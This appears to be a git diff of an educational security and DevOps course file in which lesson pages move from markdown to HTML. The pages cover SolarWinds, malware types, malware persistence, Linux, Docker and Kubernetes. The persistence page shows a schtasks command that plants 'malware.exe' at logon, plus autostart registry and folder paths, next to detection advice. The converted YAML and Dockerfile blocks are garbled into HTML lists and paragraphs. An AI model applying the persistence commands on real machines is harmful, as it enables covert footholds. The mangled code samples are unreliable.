-- The infected update was signed with SolarWinds' real certificate
-- 18,000 organizations installed the update — including the US government
+<p><strong>What happened:</strong></p>
+<ul>
+<li>Hackers compromised <strong>SolarWinds Orion</strong> — a network monitoring tool used by 33,000+ organizations</li>
+<li>They inserted a backdoor (called <strong>SUNBURST</strong>) into a legitimate software update</li>
+<li>The infected update was signed with SolarWinds' real certificate</li>
+<li>18,000 organizations installed the update — including the US government</li>
+</ul>
 
-**Who was affected:**
-- US Treasury, Commerce, Homeland Security departments
-- Microsoft, Intel, Cisco, Deloitte
-- FireEye (who discovered the attack while investigating their own breach)
+<p><strong>Who was affected:</strong></p>
+<ul>
+<li>US Treasury, Commerce, Homeland Security departments</li>
+<li>Microsoft, Intel, Cisco, Deloitte</li>
+<li>FireEye (who discovered the attack while investigating their own breach)</li>
+</ul>
 
-**How it worked:**
-1. Attackers accessed SolarWinds' build system (where software is compiled)
-2. Added malicious code to the Orion update (version 2019.4 - 2020.2.1)
-3. The backdoor waited 2 weeks after install before activating (to avoid detection)
-4. It communicated with C2 servers using DNS requests that looked like normal Orion traffic
-5. Attackers selected high-value targets and moved deeper into their networks
+<p><strong>How it worked:</strong></p>
+<ol>
+<li>Attackers accessed SolarWinds' build system (where software is compiled)</li>
+<li>Added malicious code to the Orion update (version 2019.4 - 2020.2.1)</li>
+<li>The backdoor waited 2 weeks after install before activating (to avoid detection)</li>
+<li>It communicated with C2 servers using DNS requests that looked like normal Orion traffic</li>
+<li>Attackers selected high-value targets and moved deeper into their networks</li>
+</ol>
 
-**Attribution:** Russian intelligence (SVR) — group known as APT29 / Cozy Bear
+<p><strong>Attribution:</strong> Russian intelligence (SVR) — group known as APT29 / Cozy Bear</p>
 
-**Impact:**
-- Estimated cost: $100 billion+
-- Led to a US Executive Order on improving national cybersecurity
-- Changed how organizations think about supply chain security
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Estimated cost: $100 billion+</li>
+<li>Led to a US Executive Order on improving national cybersecurity</li>
+<li>Changed how organizations think about supply chain security</li>
+</ul>
 
-**Lessons:**
-- Trust no software blindly — even from trusted vendors
-- Monitor outbound DNS and network traffic for anomalies
-- Verify software integrity (build reproducibility, code signing reviews)
-- Assume breach — have detection for post-compromise activity`
+<p><strong>Lessons:</strong></p>
+<ul>
+<li>Trust no software blindly — even from trusted vendors</li>
+<li>Monitor outbound DNS and network traffic for anomalies</li>
+<li>Verify software integrity (build reproducibility, code signing reviews)</li>
+<li>Assume breach — have detection for post-compromise activity</li>
+</ul>`
       }
     ]
   },
@@ -5342,84 +5642,110 @@ Set-Cookie: session=abc123; SameSite=Strict
     pages: [
       {
         titleEn: "Malware Types",
-        contentEn: `**Malware** = malicious software designed to harm, exploit, or steal.
+        contentEn: `<p><strong>Malware</strong> = malicious software designed to harm, exploit, or steal.</p>
 
-**Types of malware:**
+<p><strong>Types of malware:</strong></p>
 
-**Virus**
-- Attaches to legitimate files/programs
-- Spreads when the infected file is opened or shared
-- Needs human action to spread (opening a file, running a program)
+<p><strong>Virus</strong></p>
+<ul>
+<li>Attaches to legitimate files/programs</li>
+<li>Spreads when the infected file is opened or shared</li>
+<li>Needs human action to spread (opening a file, running a program)</li>
+</ul>
 
-**Worm**
-- Spreads by itself across networks — no human action needed
-- Exploits vulnerabilities to move from system to system
-- Example: WannaCry (2017) — used EternalBlue to spread via SMB, infected 230,000+ computers in 150 countries
+<p><strong>Worm</strong></p>
+<ul>
+<li>Spreads by itself across networks — no human action needed</li>
+<li>Exploits vulnerabilities to move from system to system</li>
+<li>Example: WannaCry (2017) — used EternalBlue to spread via SMB, infected 230,000+ computers in 150 countries</li>
+</ul>
 
-**Trojan**
-- Looks like legitimate software but contains malicious code
-- User installs it willingly (fake antivirus, pirated game)
-- Does not self-replicate — relies on deception
+<p><strong>Trojan</strong></p>
+<ul>
+<li>Looks like legitimate software but contains malicious code</li>
+<li>User installs it willingly (fake antivirus, pirated game)</li>
+<li>Does not self-replicate — relies on deception</li>
+</ul>
 
-**Ransomware**
-- Encrypts your files and demands payment (usually Bitcoin) for the decryption key
-- Modern variants also steal data first (double extortion)
-- Example: REvil demanded $70 million from Kaseya victims (2021)
+<p><strong>Ransomware</strong></p>
+<ul>
+<li>Encrypts your files and demands payment (usually Bitcoin) for the decryption key</li>
+<li>Modern variants also steal data first (double extortion)</li>
+<li>Example: REvil demanded $70 million from Kaseya victims (2021)</li>
+</ul>
 
-**Rootkit**
-- Hides deep in the operating system (kernel level)
-- Makes itself and other malware invisible to antivirus
-- Very difficult to detect and remove — often requires OS reinstall
-- Can survive reboots and some can survive OS reinstall (firmware rootkits)
+<p><strong>Rootkit</strong></p>
+<ul>
+<li>Hides deep in the operating system (kernel level)</li>
+<li>Makes itself and other malware invisible to antivirus</li>
+<li>Very difficult to detect and remove — often requires OS reinstall</li>
+<li>Can survive reboots and some can survive OS reinstall (firmware rootkits)</li>
+</ul>
 
-**Other types:**
-- **Spyware** — monitors user activity (keylogger, screen capture)
-- **Adware** — displays unwanted ads, tracks browsing
-- **Botnet** — network of infected computers controlled by attacker (used for DDoS)`
+<p><strong>Other types:</strong></p>
+<ul>
+<li><strong>Spyware</strong> — monitors user activity (keylogger, screen capture)</li>
+<li><strong>Adware</strong> — displays unwanted ads, tracks browsing</li>
+<li><strong>Botnet</strong> — network of infected computers controlled by attacker (used for DDoS)</li>
+</ul>`
       },
       {
         titleEn: "Persistence Mechanisms",
-        contentEn: `**Persistence** = how malware survives a reboot and stays on the system.
+        contentEn: `<p><strong>Persistence</strong> = how malware survives a reboot and stays on the system.</p>
 
-Attackers need persistence to maintain access. Here are common techniques:
+<p>Attackers need persistence to maintain access. Here are common techniques:</p>
 
-**1. Registry Run Keys (Windows)**
-- Add entries to auto-start on boot:
-\`\`\`
-HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
-\`\`\`
-- Easy to detect but still widely used
+<p><strong>1. Registry Run Keys (Windows)</strong></p>
+<ul>
+<li>Add entries to auto-start on boot:</li>
+</ul>
+<pre><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+<p>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</p>
+</code></pre>
+<ul>
+<li>Easy to detect but still widely used</li>
+</ul>
 
-**2. Scheduled Tasks / Cron Jobs**
-- Windows: \`schtasks /create /tn "Update" /tr malware.exe /sc onlogon\`
-- Linux: add to \`/etc/crontab\` or user crontab
-- Can run at specific times or on specific events
+<p><strong>2. Scheduled Tasks / Cron Jobs</strong></p>
+<ul>
+<li>Windows: <code>schtasks /create /tn "Update" /tr malware.exe /sc onlogon</code></li>
+<li>Linux: add to <code>/etc/crontab</code> or user crontab</li>
+<li>Can run at specific times or on specific events</li>
+</ul>
 
-**3. Windows Services**
-- Register malware as a Windows service → starts automatically
-- Services run with SYSTEM privileges (highest level)
-- Can be set to restart on failure
+<p><strong>3. Windows Services</strong></p>
+<ul>
+<li>Register malware as a Windows service → starts automatically</li>
+<li>Services run with SYSTEM privileges (highest level)</li>
+<li>Can be set to restart on failure</li>
+</ul>
 
-**4. Startup Folders**
-- Drop a shortcut or script in:
-\`\`\`
-C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
-\`\`\`
+<p><strong>4. Startup Folders</strong></p>
+<ul>
+<li>Drop a shortcut or script in:</li>
+</ul>
+<pre><code>C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
+</code></pre>
 
-**5. DLL Hijacking / Side-Loading**
-- Place a malicious DLL in a folder where a legitimate program searches first
-- The program loads the malicious DLL instead of the real one
+<p><strong>5. DLL Hijacking / Side-Loading</strong></p>
+<ul>
+<li>Place a malicious DLL in a folder where a legitimate program searches first</li>
+<li>The program loads the malicious DLL instead of the real one</li>
+</ul>
 
-**6. WMI Event Subscriptions (Windows)**
-- Advanced: trigger malware on specific system events
-- Hard to detect — not visible in common startup locations
+<p><strong>6. WMI Event Subscriptions (Windows)</strong></p>
+<ul>
+<li>Advanced: trigger malware on specific system events</li>
+<li>Hard to detect — not visible in common startup locations</li>
+</ul>
 
-**Detection:**
-- Use **Autoruns** (Sysinternals) — shows all auto-start locations
-- Check scheduled tasks and services regularly
-- Monitor registry changes with SIEM
-- Use EDR (Endpoint Detection and Response) tools for real-time monitoring`
+<p><strong>Detection:</strong></p>
+<ul>
+<li>Use <strong>Autoruns</strong> (Sysinternals) — shows all auto-start locations</li>
+<li>Check scheduled tasks and services regularly</li>
+<li>Monitor registry changes with SIEM</li>
+<li>Use EDR (Endpoint Detection and Response) tools for real-time monitoring</li>
+</ul>`
       }
     ]
   },
@@ -5430,125 +5756,147 @@ C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\S
     pages: [
       {
         titleEn: "The Filesystem Hierarchy (FHS)",
-        contentEn: `Linux organizes everything in a single tree that starts at /.
+        contentEn: `<p>Linux organizes everything in a single tree that starts at /.</p>
 
-**Key directories:**
-- **/bin** — essential commands (ls, cp, cat)
-- **/etc** — configuration files (like the "settings folder")
-- **/home** — each user gets a folder here (/home/alice)
-- **/var** — variable data: logs, databases, mail
-- **/tmp** — temporary files (cleared on reboot)
-- **/usr** — user programs and libraries
-- **/dev** — device files (disks, terminals)
-- **/proc** — virtual filesystem showing running processes
+<p><strong>Key directories:</strong></p>
+<ul>
+<li><strong>/bin</strong> — essential commands (ls, cp, cat)</li>
+<li><strong>/etc</strong> — configuration files (like the "settings folder")</li>
+<li><strong>/home</strong> — each user gets a folder here (/home/alice)</li>
+<li><strong>/var</strong> — variable data: logs, databases, mail</li>
+<li><strong>/tmp</strong> — temporary files (cleared on reboot)</li>
+<li><strong>/usr</strong> — user programs and libraries</li>
+<li><strong>/dev</strong> — device files (disks, terminals)</li>
+<li><strong>/proc</strong> — virtual filesystem showing running processes</li>
+</ul>
 
-**The big idea:** In Linux, everything is a file.
-A hard disk? A file (/dev/sda).
-A running process? A folder (/proc/1234).
-A network socket? Also a file.
+<p><strong>The big idea:</strong> In Linux, everything is a file.</p>
+<p>A hard disk? A file (/dev/sda).</p>
+<p>A running process? A folder (/proc/1234).</p>
+<p>A network socket? Also a file.</p>
 
-This is very different from Windows, where drives have letters (C:\\, D:\\) and settings live in the Registry.`
+<p>This is very different from Windows, where drives have letters (C:\\, D:\\) and settings live in the Registry.</p>`
       },
       {
         titleEn: "Essential Linux Commands",
-        contentEn: `Every DevOps engineer uses these commands daily.
+        contentEn: `<p>Every DevOps engineer uses these commands daily.</p>
 
-**System monitoring:**
-- **top** / **htop** — see CPU and memory usage live
-- **df -h** — show disk space ("disk free, human-readable")
-- **free -h** — show RAM usage
+<p><strong>System monitoring:</strong></p>
+<ul>
+<li><strong>top</strong> / <strong>htop</strong> — see CPU and memory usage live</li>
+<li><strong>df -h</strong> — show disk space ("disk free, human-readable")</li>
+<li><strong>free -h</strong> — show RAM usage</li>
+</ul>
 
-**Network:**
-- **ss -tulnp** — show open ports and which process uses them
-- **curl** — make HTTP requests from the terminal
+<p><strong>Network:</strong></p>
+<ul>
+<li><strong>ss -tulnp</strong> — show open ports and which process uses them</li>
+<li><strong>curl</strong> — make HTTP requests from the terminal</li>
+</ul>
 
-**Logs and debugging:**
-- **journalctl -u nginx** — read logs for a specific service
-- **journalctl -f** — follow logs in real time (like a live stream)
-- **lsof -i :8080** — find which process uses port 8080
+<p><strong>Logs and debugging:</strong></p>
+<ul>
+<li><strong>journalctl -u nginx</strong> — read logs for a specific service</li>
+<li><strong>journalctl -f</strong> — follow logs in real time (like a live stream)</li>
+<li><strong>lsof -i :8080</strong> — find which process uses port 8080</li>
+</ul>
 
-**File operations:**
-- **grep -r "error" /var/log/** — search for "error" in all log files
-- **tail -f /var/log/syslog** — watch a log file live
-- **find / -name "*.conf"** — find all config files
+<p><strong>File operations:</strong></p>
+<ul>
+<li><strong>grep -r "error" /var/log/</strong> — search for "error" in all log files</li>
+<li><strong>tail -f /var/log/syslog</strong> — watch a log file live</li>
+<li><strong>find / -name "*.conf"</strong> — find all config files</li>
+</ul>
 
-> A good DevOps engineer does not guess. They check logs first.`
+<p>> A good DevOps engineer does not guess. They check logs first.</p>`
       },
       {
         titleEn: "Permissions: chmod and chown",
-        contentEn: `Linux controls who can read, write, or run each file.
+        contentEn: `<p>Linux controls who can read, write, or run each file.</p>
 
-**Three permission groups:**
-- **Owner** — the user who created the file
-- **Group** — a team of users
-- **Others** — everyone else
+<p><strong>Three permission groups:</strong></p>
+<ul>
+<li><strong>Owner</strong> — the user who created the file</li>
+<li><strong>Group</strong> — a team of users</li>
+<li><strong>Others</strong> — everyone else</li>
+</ul>
 
-**Three permission types:**
-- **r** (read = 4) — can open and read
-- **w** (write = 2) — can change or delete
-- **x** (execute = 1) — can run as a program
+<p><strong>Three permission types:</strong></p>
+<ul>
+<li><strong>r</strong> (read = 4) — can open and read</li>
+<li><strong>w</strong> (write = 2) — can change or delete</li>
+<li><strong>x</strong> (execute = 1) — can run as a program</li>
+</ul>
 
-**Reading permissions:**
-\`-rwxr-xr--\` means:
-- Owner: rwx (read + write + execute = 7)
-- Group: r-x (read + execute = 5)
-- Others: r-- (read only = 4)
+<p><strong>Reading permissions:</strong></p>
+<p><code>-rwxr-xr--</code> means:</p>
+<ul>
+<li>Owner: rwx (read + write + execute = 7)</li>
+<li>Group: r-x (read + execute = 5)</li>
+<li>Others: r-- (read only = 4)</li>
+</ul>
 
-**Commands:**
-- \`chmod 755 script.sh\` — owner can do all, others can read and run
-- \`chmod 600 secret.key\` — only owner can read and write
-- \`chown alice:devteam file.txt\` — change owner to alice, group to devteam
+<p><strong>Commands:</strong></p>
+<ul>
+<li><code>chmod 755 script.sh</code> — owner can do all, others can read and run</li>
+<li><code>chmod 600 secret.key</code> — only owner can read and write</li>
+<li><code>chown alice:devteam file.txt</code> — change owner to alice, group to devteam</li>
+</ul>
 
 {question}
-A file has permissions \`-rw-r-----\`. Who can read it?
-a) Everyone on the system
-b) Only the owner and the group
-c) Only the owner
-d) Nobody
+<p>A file has permissions <code>-rw-r-----</code>. Who can read it?</p>
+<p>a) Everyone on the system</p>
+<p>b) Only the owner and the group</p>
+<p>c) Only the owner</p>
+<p>d) Nobody</p>
 
-answer: b
-explanation: Owner has rw- (read+write), Group has r-- (read only), Others have --- (no access).`
+<p>answer: b</p>
+<p>explanation: Owner has rw- (read+write), Group has r-- (read only), Others have --- (no access).</p>`
       },
       {
         titleEn: "systemd: Managing Services",
-        contentEn: `systemd is the boss of all processes on modern Linux.
+        contentEn: `<p>systemd is the boss of all processes on modern Linux.</p>
 
-**What is a service?**
-A program that runs in the background. Examples: a web server (nginx), a database (postgres), your own app.
+<p><strong>What is a service?</strong></p>
+<p>A program that runs in the background. Examples: a web server (nginx), a database (postgres), your own app.</p>
 
-**Essential commands:**
-- \`systemctl start nginx\` — start the service
-- \`systemctl stop nginx\` — stop the service
-- \`systemctl restart nginx\` — stop then start
-- \`systemctl status nginx\` — is it running? any errors?
-- \`systemctl enable nginx\` — start automatically on boot
-- \`systemctl disable nginx\` — do not start on boot
+<p><strong>Essential commands:</strong></p>
+<ul>
+<li><code>systemctl start nginx</code> — start the service</li>
+<li><code>systemctl stop nginx</code> — stop the service</li>
+<li><code>systemctl restart nginx</code> — stop then start</li>
+<li><code>systemctl status nginx</code> — is it running? any errors?</li>
+<li><code>systemctl enable nginx</code> — start automatically on boot</li>
+<li><code>systemctl disable nginx</code> — do not start on boot</li>
+</ul>
 
-**Creating your own service:**
-\`\`\`ini
-# /etc/systemd/system/myapp.service
-[Unit]
-Description=My Application
-After=network.target
+<p><strong>Creating your own service:</strong></p>
+<pre><code>ini
+<p># /etc/systemd/system/myapp.service</p>
+<p>[Unit]</p>
+<p>Description=My Application</p>
+<p>After=network.target</p>
 
-[Service]
-ExecStart=/usr/bin/python3 /opt/myapp/server.py
-Restart=always
-User=appuser
+<p>[Service]</p>
+<p>ExecStart=/usr/bin/python3 /opt/myapp/server.py</p>
+<p>Restart=always</p>
+<p>User=appuser</p>
 
-[Install]
-WantedBy=multi-user.target
-\`\`\`
+<p>[Install]</p>
+<p>WantedBy=multi-user.target</p>
+</code></pre>
 
-**Key idea:** \`Restart=always\` means if your app crashes, systemd will restart it automatically. This is self-healing at the OS level.
+<p><strong>Key idea:</strong> <code>Restart=always</code> means if your app crashes, systemd will restart it automatically. This is self-healing at the OS level.</p>
 
 {simulation}
-Your web app is not responding. Walk through the debugging steps:
-1. \`systemctl status myapp\` — is the service running?
-2. \`journalctl -u myapp -n 50\` — what do the last 50 log lines say?
-3. \`ss -tulnp | grep 8080\` — is something blocking the port?
-4. \`df -h\` — is the disk full?
-5. \`free -h\` — is the system out of memory?`
+<p>Your web app is not responding. Walk through the debugging steps:</p>
+<ol>
+<li><code>systemctl status myapp</code> — is the service running?</li>
+<li><code>journalctl -u myapp -n 50</code> — what do the last 50 log lines say?</li>
+<li><code>ss -tulnp | grep 8080</code> — is something blocking the port?</li>
+<li><code>df -h</code> — is the disk full?</li>
+<li><code>free -h</code> — is the system out of memory?</li>
+</ol>`
       }
     ]
   },
@@ -5558,175 +5906,213 @@ Your web app is not responding. Walk through the debugging steps:
     pages: [
       {
         titleEn: "VMs vs Containers",
-        contentEn: `Both VMs and containers isolate applications, but in very different ways.
+        contentEn: `<p>Both VMs and containers isolate applications, but in very different ways.</p>
 
-**Virtual Machine (VM):**
-- Runs a full operating system inside your OS
-- Has its own kernel, drivers, and libraries
-- Heavyweight: takes minutes to start, uses GBs of RAM
-- Example: VirtualBox, VMware, EC2 instances
+<p><strong>Virtual Machine (VM):</strong></p>
+<ul>
+<li>Runs a full operating system inside your OS</li>
+<li>Has its own kernel, drivers, and libraries</li>
+<li>Heavyweight: takes minutes to start, uses GBs of RAM</li>
+<li>Example: VirtualBox, VMware, EC2 instances</li>
+</ul>
 
-**Container:**
-- Shares the host OS kernel
-- Only packs the app + its dependencies
-- Lightweight: starts in seconds, uses MBs of RAM
-- Example: Docker containers
+<p><strong>Container:</strong></p>
+<ul>
+<li>Shares the host OS kernel</li>
+<li>Only packs the app + its dependencies</li>
+<li>Lightweight: starts in seconds, uses MBs of RAM</li>
+<li>Example: Docker containers</li>
+</ul>
 
-**Analogy:**
-- A VM is like renting an entire apartment (your own kitchen, bathroom, walls)
-- A container is like a co-working desk (shared building, your own space)
+<p><strong>Analogy:</strong></p>
+<ul>
+<li>A VM is like renting an entire apartment (your own kitchen, bathroom, walls)</li>
+<li>A container is like a co-working desk (shared building, your own space)</li>
+</ul>
 
-**Why containers won:**
-- 10x faster startup
-- 10x less disk and memory usage
-- Easy to move between machines (works on my laptop = works on the server)
-- Perfect for microservices (one container per service)
+<p><strong>Why containers won:</strong></p>
+<ul>
+<li>10x faster startup</li>
+<li>10x less disk and memory usage</li>
+<li>Easy to move between machines (works on my laptop = works on the server)</li>
+<li>Perfect for microservices (one container per service)</li>
+</ul>
 
-| Feature | VM | Container |
-|---|---|---|
-| Startup time | Minutes | Seconds |
-| Size | GBs | MBs |
-| Isolation | Full OS | Process-level |
-| Performance | Some overhead | Near-native |`
+<table>
+<thead><tr><th>Feature</th><th>VM</th><th>Container</th></tr></thead>
+<tbody>
+<tr><td>Startup time</td><td>Minutes</td><td>Seconds</td></tr>
+<tr><td>Size</td><td>GBs</td><td>MBs</td></tr>
+<tr><td>Isolation</td><td>Full OS</td><td>Process-level</td></tr>
+<tr><td>Performance</td><td>Some overhead</td><td>Near-native</td></tr>
+</tbody></table>`
       },
       {
         titleEn: "Dockerfile: Building Images",
-        contentEn: `A Dockerfile is a recipe that tells Docker how to build an image.
+        contentEn: `<p>A Dockerfile is a recipe that tells Docker how to build an image.</p>
 
-**Key instructions:**
-- **FROM** — the base image to start from
-- **RUN** — execute a command during build
-- **COPY** — copy files from your machine into the image
-- **CMD** — the default command when the container starts
-- **EXPOSE** — document which port the app uses
-- **ENV** — set environment variables
+<p><strong>Key instructions:</strong></p>
+<ul>
+<li><strong>FROM</strong> — the base image to start from</li>
+<li><strong>RUN</strong> — execute a command during build</li>
+<li><strong>COPY</strong> — copy files from your machine into the image</li>
+<li><strong>CMD</strong> — the default command when the container starts</li>
+<li><strong>EXPOSE</strong> — document which port the app uses</li>
+<li><strong>ENV</strong> — set environment variables</li>
+</ul>
 
-**Example:**
-\`\`\`dockerfile
-FROM node:20-alpine
-WORKDIR /app
-COPY package*.json ./
-RUN npm install
-COPY . .
-EXPOSE 3000
-CMD ["node", "server.js"]
-\`\`\`
+<p><strong>Example:</strong></p>
+<pre><code>dockerfile
+<p>FROM node:20-alpine</p>
+<p>WORKDIR /app</p>
+<p>COPY package*.json ./</p>
+<p>RUN npm install</p>
+<p>COPY . .</p>
+<p>EXPOSE 3000</p>
+<p>CMD ["node", "server.js"]</p>
+</code></pre>
 
-**How layers work:**
-Each instruction creates a layer. Docker caches layers.
-If you change your code but not package.json, Docker skips the \`npm install\` layer. This makes builds fast.
+<p><strong>How layers work:</strong></p>
+<p>Each instruction creates a layer. Docker caches layers.</p>
+<p>If you change your code but not package.json, Docker skips the <code>npm install</code> layer. This makes builds fast.</p>
 
-**Layer order matters:**
-- Put things that change rarely at the top (FROM, package.json)
-- Put things that change often at the bottom (COPY source code)
+<p><strong>Layer order matters:</strong></p>
+<ul>
+<li>Put things that change rarely at the top (FROM, package.json)</li>
+<li>Put things that change often at the bottom (COPY source code)</li>
+</ul>
 
-**Build and run:**
-\`\`\`bash
-docker build -t myapp:1.0 .
-docker run -p 3000:3000 myapp:1.0
-\`\`\`
+<p><strong>Build and run:</strong></p>
+<pre><code>bash
+<p>docker build -t myapp:1.0 .</p>
+<p>docker run -p 3000:3000 myapp:1.0</p>
+</code></pre>
 
 {question}
-Why do we COPY package.json before COPY . (the full source)?
-a) It does not matter, the order is random
-b) So Docker can cache the npm install layer when only code changes
-c) Because package.json must be copied first by law
-d) To make the image smaller
+<p>Why do we COPY package.json before COPY . (the full source)?</p>
+<p>a) It does not matter, the order is random</p>
+<p>b) So Docker can cache the npm install layer when only code changes</p>
+<p>c) Because package.json must be copied first by law</p>
+<p>d) To make the image smaller</p>
 
-answer: b
-explanation: Docker caches each layer. If package.json did not change, the RUN npm install layer is reused. This saves minutes on every build.`
+<p>answer: b</p>
+<p>explanation: Docker caches each layer. If package.json did not change, the RUN npm install layer is reused. This saves minutes on every build.</p>`
       },
       {
         titleEn: "Docker Compose: Multi-Container Apps",
-        contentEn: `Most real apps need more than one container. Docker Compose manages them all.
+        contentEn: `<p>Most real apps need more than one container. Docker Compose manages them all.</p>
 
-**Example: web app + database + cache**
-\`\`\`yaml
-# docker-compose.yml
-version: "3.8"
-services:
-  web:
-    build: .
-    ports:
-      - "3000:3000"
-    environment:
-      - DB_HOST=db
-      - REDIS_HOST=cache
-    depends_on:
-      - db
-      - cache
+<p><strong>Example: web app + database + cache</strong></p>
+<pre><code>yaml
+<p># docker-compose.yml</p>
+<p>version: "3.8"</p>
+<p>services:</p>
+<p>web:</p>
+<p>build: .</p>
+<p>ports:</p>
+<ul>
+<li>"3000:3000"</li>
+</ul>
+<p>environment:</p>
+<ul>
+<li>DB_HOST=db</li>
+<li>REDIS_HOST=cache</li>
+</ul>
+<p>depends_on:</p>
+<ul>
+<li>db</li>
+<li>cache</li>
+</ul>
 
-  db:
-    image: postgres:15
-    environment:
-      POSTGRES_PASSWORD: secret
-    volumes:
-      - pgdata:/var/lib/postgresql/data
+<p>db:</p>
+<p>image: postgres:15</p>
+<p>environment:</p>
+<p>POSTGRES_PASSWORD: secret</p>
+<p>volumes:</p>
+<ul>
+<li>pgdata:/var/lib/postgresql/data</li>
+</ul>
 
-  cache:
-    image: redis:7-alpine
+<p>cache:</p>
+<p>image: redis:7-alpine</p>
 
-volumes:
-  pgdata:
-\`\`\`
+<p>volumes:</p>
+<p>pgdata:</p>
+</code></pre>
 
-**Key concepts:**
-- **services** — each service is one container
-- **depends_on** — start db and cache before web
-- **volumes** — pgdata keeps database files safe even if the container is deleted
-- **environment** — pass config without hardcoding
+<p><strong>Key concepts:</strong></p>
+<ul>
+<li><strong>services</strong> — each service is one container</li>
+<li><strong>depends_on</strong> — start db and cache before web</li>
+<li><strong>volumes</strong> — pgdata keeps database files safe even if the container is deleted</li>
+<li><strong>environment</strong> — pass config without hardcoding</li>
+</ul>
 
-**Commands:**
-- \`docker compose up -d\` — start all services in background
-- \`docker compose down\` — stop and remove all containers
-- \`docker compose logs -f web\` — follow logs of the web service
-- \`docker compose ps\` — list running services
+<p><strong>Commands:</strong></p>
+<ul>
+<li><code>docker compose up -d</code> — start all services in background</li>
+<li><code>docker compose down</code> — stop and remove all containers</li>
+<li><code>docker compose logs -f web</code> — follow logs of the web service</li>
+<li><code>docker compose ps</code> — list running services</li>
+</ul>
 
-**Why Compose matters:** One command to start your entire application stack. New developer? Clone the repo, run \`docker compose up\`, done.`
+<p><strong>Why Compose matters:</strong> One command to start your entire application stack. New developer? Clone the repo, run <code>docker compose up</code>, done.</p>`
       },
       {
         titleEn: "Docker Networking",
-        contentEn: `Containers need to talk to each other and to the outside world. Docker provides three network types.
+        contentEn: `<p>Containers need to talk to each other and to the outside world. Docker provides three network types.</p>
 
-**Bridge (default):**
-- Containers on the same bridge network can reach each other by name
-- Isolated from the host and from other networks
-- Best for: single-machine apps, development
+<p><strong>Bridge (default):</strong></p>
+<ul>
+<li>Containers on the same bridge network can reach each other by name</li>
+<li>Isolated from the host and from other networks</li>
+<li>Best for: single-machine apps, development</li>
+</ul>
 
-**Host:**
-- Container shares the host's network directly
-- No port mapping needed (the container IS the host, network-wise)
-- Best for: maximum performance, monitoring tools
+<p><strong>Host:</strong></p>
+<ul>
+<li>Container shares the host's network directly</li>
+<li>No port mapping needed (the container IS the host, network-wise)</li>
+<li>Best for: maximum performance, monitoring tools</li>
+</ul>
 
-**Overlay:**
-- Connects containers across multiple machines
-- Used in Docker Swarm and Kubernetes
-- Best for: production clusters
+<p><strong>Overlay:</strong></p>
+<ul>
+<li>Connects containers across multiple machines</li>
+<li>Used in Docker Swarm and Kubernetes</li>
+<li>Best for: production clusters</li>
+</ul>
 
-**How containers find each other:**
-\`\`\`yaml
-# In docker-compose.yml, services talk by name:
-web:
-  environment:
-    - DB_HOST=db    # "db" resolves to the db container's IP
-\`\`\`
+<p><strong>How containers find each other:</strong></p>
+<pre><code>yaml
+<p># In docker-compose.yml, services talk by name:</p>
+<p>web:</p>
+<p>environment:</p>
+<ul>
+<li>DB_HOST=db    # "db" resolves to the db container's IP</li>
+</ul>
+</code></pre>
 
-Docker runs its own internal DNS. When the web container asks for "db", Docker returns the IP of the database container.
+<p>Docker runs its own internal DNS. When the web container asks for "db", Docker returns the IP of the database container.</p>
 
 {thinkOutside}
-You have three microservices: API, Worker, and Database.
-- The API must be reachable from the internet (port 8080)
-- The Worker processes background jobs and talks to the Database
-- The Database must NOT be reachable from the internet
+<p>You have three microservices: API, Worker, and Database.</p>
+<ul>
+<li>The API must be reachable from the internet (port 8080)</li>
+<li>The Worker processes background jobs and talks to the Database</li>
+<li>The Database must NOT be reachable from the internet</li>
+</ul>
 
-How would you design the Docker networks?
+<p>How would you design the Docker networks?</p>
 
-Hint: You can create multiple networks. A container can join more than one network.
+<p>Hint: You can create multiple networks. A container can join more than one network.</p>
 
-Possible solution:
-- Network "frontend": API container (exposed port 8080)
-- Network "backend": API + Worker + Database
-- The API is on both networks. The Database is only on "backend", so the internet cannot reach it directly.`
+<p>Possible solution:</p>
+<ul>
+<li>Network "frontend": API container (exposed port 8080)</li>
+<li>Network "backend": API + Worker + Database</li>
+<li>The API is on both networks. The Database is only on "backend", so the internet cannot reach it directly.</li>
+</ul>`
       }
     ]
   },
@@ -5736,197 +6122,237 @@ Possible solution:
     pages: [
       {
         titleEn: "Core K8s Objects",
-        contentEn: `Kubernetes manages containers at scale. It uses objects to describe what you want.
+        contentEn: `<p>Kubernetes manages containers at scale. It uses objects to describe what you want.</p>
 
-**Pod:**
-- The smallest unit in K8s
-- Contains one or more containers that share storage and network
-- Usually: one main container per Pod
-- Pods are temporary — they can be killed and recreated
+<p><strong>Pod:</strong></p>
+<ul>
+<li>The smallest unit in K8s</li>
+<li>Contains one or more containers that share storage and network</li>
+<li>Usually: one main container per Pod</li>
+<li>Pods are temporary — they can be killed and recreated</li>
+</ul>
 
-**Deployment:**
-- Manages a set of identical Pods
-- You say "I want 3 copies", K8s keeps 3 running at all times
-- Handles rolling updates: replace old version with new, one by one
+<p><strong>Deployment:</strong></p>
+<ul>
+<li>Manages a set of identical Pods</li>
+<li>You say "I want 3 copies", K8s keeps 3 running at all times</li>
+<li>Handles rolling updates: replace old version with new, one by one</li>
+</ul>
 
-**Service:**
-- A stable network address for a group of Pods
-- Pods change IPs when they restart. A Service gives them a fixed name.
-- Types: ClusterIP (internal), NodePort (external port), LoadBalancer (cloud LB)
+<p><strong>Service:</strong></p>
+<ul>
+<li>A stable network address for a group of Pods</li>
+<li>Pods change IPs when they restart. A Service gives them a fixed name.</li>
+<li>Types: ClusterIP (internal), NodePort (external port), LoadBalancer (cloud LB)</li>
+</ul>
 
-**ConfigMap:**
-- Stores configuration as key-value pairs
-- Keeps config outside your container image
-- Example: database URL, feature flags
+<p><strong>ConfigMap:</strong></p>
+<ul>
+<li>Stores configuration as key-value pairs</li>
+<li>Keeps config outside your container image</li>
+<li>Example: database URL, feature flags</li>
+</ul>
 
-**Secret:**
-- Like ConfigMap but for sensitive data
-- Base64 encoded (not encrypted by default!)
-- Example: passwords, API keys, TLS certificates
+<p><strong>Secret:</strong></p>
+<ul>
+<li>Like ConfigMap but for sensitive data</li>
